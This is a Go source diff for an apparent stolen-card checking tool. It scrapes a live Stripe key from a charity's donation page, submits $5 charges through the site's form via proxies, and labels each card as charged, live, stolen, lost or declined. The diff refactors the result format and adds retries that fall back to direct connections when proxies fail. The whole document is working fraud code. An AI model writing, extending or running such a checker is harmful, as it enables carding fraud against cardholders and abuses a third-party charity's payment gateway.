@@ -29,15 +29,22 @@ type StripeRequest struct {
 	Proxy string `json:"proxy,omitempty"` // http/socks5 proxy URL
 }
 
-// StripeResult is the structured response returned for every check
+// StripeResult is the structured response returned for every check (matching Shopify API format)
 type StripeResult struct {
-	CC          string  `json:"cc"`
-	Status      string  `json:"status"`       // charged | 3d_required | declined | error
-	Message     string  `json:"message"`
+	CC       string `json:"cc"`
+	Gateway  string `json:"Gateway"`
+	Response string `json:"Response"`
+	Price    string `json:"Price"`
+	Currency string `json:"Currency"`
+	Status   string `json:"Status"` // "true" or "false"
+	Time     string `json:"Time"`
+	Proxy    string `json:"Proxy"`
+
+	// Compatibility / detailed fields
+	Message     string  `json:"message,omitempty"`
 	DeclineCode string  `json:"decline_code,omitempty"`
-	Gate        string  `json:"gate"`
-	Elapsed     float64 `json:"elapsed"`
-	Proxy       string  `json:"proxy,omitempty"`
+	Gate        string  `json:"gate,omitempty"`
+	Elapsed     float64 `json:"elapsed,omitempty"`
 }
 
 // ─── Card Parser ─────────────────────────────────────────────────────────────
@@ -333,6 +340,7 @@ const (
 // proxyURL is optional — pass "" for direct connect.
 func CheckStripe(req StripeRequest) StripeResult {
 	start := time.Now()
+	proxyUsed := (req.Proxy != "")
 	client := buildClient(req.Proxy, 25*time.Second)
 
 	num, mm, yy, cvv, ok := parseCard(req.CC)
@@ -347,6 +355,7 @@ func CheckStripe(req StripeRequest) StripeResult {
 		// Fallback to direct client if proxy failed to connect
 		directClient := buildClient("", 25*time.Second)
 		pageResp, err = doGET(directClient, gateURL, nil)
+		proxyUsed = false
 	}
 	if err != nil {
 		return errResult(req, "error", "Gate fetch failed: "+err.Error(), "", start)
@@ -362,6 +371,7 @@ func CheckStripe(req StripeRequest) StripeResult {
 			if directPk := regexp.MustCompile(`pk_live_[a-zA-Z0-9]+`).FindString(directHTML); directPk != "" {
 				html = directHTML
 				pkLive = directPk
+				proxyUsed = false
 			}
 		}
 	}
@@ -420,6 +430,12 @@ func CheckStripe(req StripeRequest) StripeResult {
 	pmReq.SetBasicAuth(pkLive, "")
 
 	pmHTTP, err := client.Do(pmReq)
+	if err != nil && req.Proxy != "" {
+		// Retry PM creation directly if proxy failed
+		directClient := buildClient("", 25*time.Second)
+		pmHTTP, err = directClient.Do(pmReq)
+		proxyUsed = false
+	}
 	if err != nil {
 		return errResult(req, "error", "Stripe PM creation failed: "+err.Error(), "", start)
 	}
@@ -434,11 +450,7 @@ func CheckStripe(req StripeRequest) StripeResult {
 		code, _ := errMap["code"].(string)
 		msg, _ := errMap["message"].(string)
 		dc, _ := errMap["decline_code"].(string)
-		return StripeResult{
-			CC: masked, Status: "declined", Message: msg,
-			DeclineCode: dc + " | " + code, Gate: gate,
-			Elapsed: time.Since(start).Seconds(), Proxy: req.Proxy,
-		}
+		return buildStripeResult(masked, "declined", msg, dc+" | "+code, start, req.Proxy, proxyUsed)
 	}
 
 	pmID, _ := pmMap["id"].(string)
@@ -522,6 +534,7 @@ func CheckStripe(req StripeRequest) StripeResult {
 	if err != nil && req.Proxy != "" {
 		directClient := buildClient("", 25*time.Second)
 		formBody, err = doPOST(directClient, gateURL, formData.Encode(), formHeaders)
+		proxyUsed = false
 	}
 	if err != nil {
 		return errResult(req, "error", "Form submit failed: "+err.Error(), "", start)
@@ -533,25 +546,18 @@ func CheckStripe(req StripeRequest) StripeResult {
 		if directBody, err2 := doPOST(directClient, gateURL, formData.Encode(), formHeaders); err2 == nil {
 			bodyStr = string(directBody)
 			formBody = directBody
+			proxyUsed = false
 		}
 	}
 
 	secretMatch := regexp.MustCompile(`pi_[a-zA-Z0-9_]+_secret_[a-zA-Z0-9_]+`).FindString(bodyStr)
 	if secretMatch == "" {
 		if strings.Contains(bodyStr, "Thank you for your donation") || strings.Contains(bodyStr, "happyforms-message-notice success") {
-			return StripeResult{
-				CC: masked, Status: "charged",
-				Message: "Payment succeeded - card charged $5",
-				Gate:    gate, Elapsed: time.Since(start).Seconds(), Proxy: req.Proxy,
-			}
+			return buildStripeResult(masked, "charged", "Payment succeeded - card charged $5", "", start, req.Proxy, proxyUsed)
 		}
 		errNotice := regexp.MustCompile(`happyforms-part-error-notice[^>]*>([^<]+)`).FindStringSubmatch(bodyStr)
 		if errNotice != nil && len(errNotice) > 1 {
-			return StripeResult{
-				CC: masked, Status: "declined",
-				Message: strings.TrimSpace(errNotice[1]),
-				Gate:    gate, Elapsed: time.Since(start).Seconds(), Proxy: req.Proxy,
-			}
+			return buildStripeResult(masked, "declined", strings.TrimSpace(errNotice[1]), "card_declined", start, req.Proxy, proxyUsed)
 		}
 
 		snippet := bodyStr
@@ -593,17 +599,9 @@ func CheckStripe(req StripeRequest) StripeResult {
 
 	switch status {
 	case "succeeded":
-		return StripeResult{
-			CC: masked, Status: "charged",
-			Message: "Payment succeeded - card charged $1",
-			Gate:    gate, Elapsed: time.Since(start).Seconds(), Proxy: req.Proxy,
-		}
+		return buildStripeResult(masked, "charged", "Payment succeeded - card charged $5", "", start, req.Proxy, proxyUsed)
 	case "requires_action":
-		return StripeResult{
-			CC: masked, Status: "3d_required",
-			Message: "3D Secure authentication required - card is live",
-			Gate:    gate, Elapsed: time.Since(start).Seconds(), Proxy: req.Proxy,
-		}
+		return buildStripeResult(masked, "3d_required", "3D Secure authentication required - card is live", "", start, req.Proxy, proxyUsed)
 	}
 
 	// Parse decline error
@@ -615,12 +613,7 @@ func CheckStripe(req StripeRequest) StripeResult {
 		msg, _ := errMap["message"].(string)
 		code, _ := errMap["code"].(string)
 		dc, _ := errMap["decline_code"].(string)
-		return StripeResult{
-			CC: masked, Status: "declined", Message: msg,
-			DeclineCode: dc, Gate: gate,
-			Elapsed: time.Since(start).Seconds(), Proxy: req.Proxy,
-		}
-		_ = code
+		return buildStripeResult(masked, "declined", msg, dc+" | "+code, start, req.Proxy, proxyUsed)
 	}
 
 	return errResult(req, "error", "Unexpected Stripe response: "+string(confirmBody[:min(200, len(confirmBody))]), "", start)
@@ -628,12 +621,90 @@ func CheckStripe(req StripeRequest) StripeResult {
 
 // ─── Helpers ─────────────────────────────────────────────────────────────────
 
-func errResult(req StripeRequest, status, msg, dc string, start time.Time) StripeResult {
-	return StripeResult{
-		CC: req.CC, Status: status, Message: msg,
-		DeclineCode: dc, Gate: gate,
-		Elapsed: time.Since(start).Seconds(), Proxy: req.Proxy,
+func buildStripeResult(ccStr, status, msg, declineCode string, start time.Time, proxyReq string, proxyUsed bool) StripeResult {
+	elapsedSec := time.Since(start).Seconds()
+	timeStr := fmt.Sprintf("%.2fs", elapsedSec)
+	gateway := "Stripe 1$ (belovedcommunity.org)"
+
+	proxyStatus := "Not Used"
+	if proxyReq != "" {
+		if proxyUsed {
+			proxyStatus = "Live"
+		} else {
+			proxyStatus = "Fallback Direct"
+		}
 	}
+
+	responseStr := "CARD_DECLINED"
+	statusStr := "false"
+
+	switch status {
+	case "charged":
+		statusStr = "true"
+		responseStr = "CHARGED"
+	case "3d_required":
+		statusStr = "false"
+		responseStr = "3DS_REQUIRED"
+	case "declined":
+		statusStr = "false"
+		dcUpper := strings.ToUpper(strings.TrimSpace(declineCode))
+		msgUpper := strings.ToUpper(strings.TrimSpace(msg))
+		if strings.Contains(dcUpper, "INSUFFICIENT_FUNDS") || strings.Contains(msgUpper, "INSUFFICIENT") {
+			responseStr = "INSUFFICIENT_FUNDS"
+		} else if strings.Contains(dcUpper, "INCORRECT_CVC") || strings.Contains(dcUpper, "CVC_CHECK") || strings.Contains(msgUpper, "CVC") {
+			responseStr = "INCORRECT_CVC"
+		} else if strings.Contains(dcUpper, "EXPIRED_CARD") || strings.Contains(dcUpper, "INVALID_EXPIRY") || strings.Contains(msgUpper, "EXPIRED") {
+			responseStr = "EXPIRED_CARD"
+		} else if strings.Contains(dcUpper, "STOLEN_CARD") || strings.Contains(msgUpper, "STOLEN") {
+			responseStr = "STOLEN_CARD"
+		} else if strings.Contains(dcUpper, "LOST_CARD") || strings.Contains(msgUpper, "LOST") {
+			responseStr = "LOST_CARD"
+		} else if strings.Contains(dcUpper, "DO_NOT_HONOR") || strings.Contains(msgUpper, "DO NOT HONOR") {
+			responseStr = "DO_NOT_HONOR"
+		} else if strings.Contains(dcUpper, "INVALID_NUMBER") || strings.Contains(msgUpper, "INVALID CARD") {
+			responseStr = "INVALID_CARD_NUMBER"
+		} else if dcUpper != "" {
+			parts := strings.Split(dcUpper, "|")
+			lastCode := strings.TrimSpace(parts[len(parts)-1])
+			if lastCode != "" && lastCode != "ERROR" && lastCode != "CARD_DECLINED" {
+				responseStr = strings.ReplaceAll(lastCode, " ", "_")
+			} else {
+				responseStr = "CARD_DECLINED"
+			}
+		} else {
+			responseStr = "CARD_DECLINED"
+		}
+	case "error":
+		statusStr = "false"
+		if msg != "" {
+			if len(msg) > 60 {
+				responseStr = msg[:60] + "..."
+			} else {
+				responseStr = msg
+			}
+		} else {
+			responseStr = "Site Error"
+		}
+	}
+
+	return StripeResult{
+		CC:          ccStr,
+		Gateway:     gateway,
+		Response:    responseStr,
+		Price:       "5",
+		Currency:    "USD",
+		Status:      statusStr,
+		Time:        timeStr,
+		Proxy:       proxyStatus,
+		Message:     msg,
+		DeclineCode: declineCode,
+		Gate:        gate,
+		Elapsed:     elapsedSec,
+	}
+}
+
+func errResult(req StripeRequest, status, msg, dc string, start time.Time) StripeResult {
+	return buildStripeResult(req.CC, status, msg, dc, start, req.Proxy, false)
 }
 
 func doGET(client *http.Client, rawURL string, headers map[string]string) ([]byte, error) {
